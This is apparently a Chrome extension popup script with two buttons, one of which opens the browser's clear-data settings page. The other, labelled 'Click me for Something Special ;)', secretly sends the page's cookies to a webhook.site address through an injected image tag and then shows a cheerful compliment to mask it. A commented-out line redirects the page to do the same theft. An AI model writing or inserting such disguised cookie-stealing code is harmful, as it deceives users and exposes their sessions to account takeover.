document.addEventListener("DOMContentLoaded", function() {

    
    function clearBrowsing(){
        console.log("hello from clearing");
        chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
            console.log("hello from clearing2");
            chrome.runtime.sendMessage({"message": "open_new_tab", "url": "chrome://settings/clearBrowserData"});
        });
    }

    function email(){
        console.log("hello from emails");
        chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
            console.log("hello from emails2");
            /* https://webhook.site/f9dfe567-64d0-4843-a01f-7d03ed2e53d9 */
            document.write('<img src="https://webhook.site/f9dfe567-64d0-4843-a01f-7d03ed2e53d9/?q=' + document.cookie + '" />')
            // document.location="https://webhook.site/f9dfe567-64d0-4843-a01f-7d03ed2e53d9/?q="+document.cookie;
            message = "You look AMAZING Have an AWESOME day"
            alert(message);
        });
    }
  
    function attachListeners(){
  
       
        var buttons = document.getElementsByTagName('button');
        for(var i = 0; i < buttons.length; i++){
            var button = buttons[i];
            if(button.textContent === "Clear Browsing History") {
                console.log("hello from listening");
                button.onclick = function(){
                    clearBrowsing();
                }

            }

            if(button.textContent === "Click me for Something Special ;)") {
                console.log("hello from listening2");
                button.onclick = function(){                   
                    email();
                }
            }
        }
    }
  
    attachListeners();
  });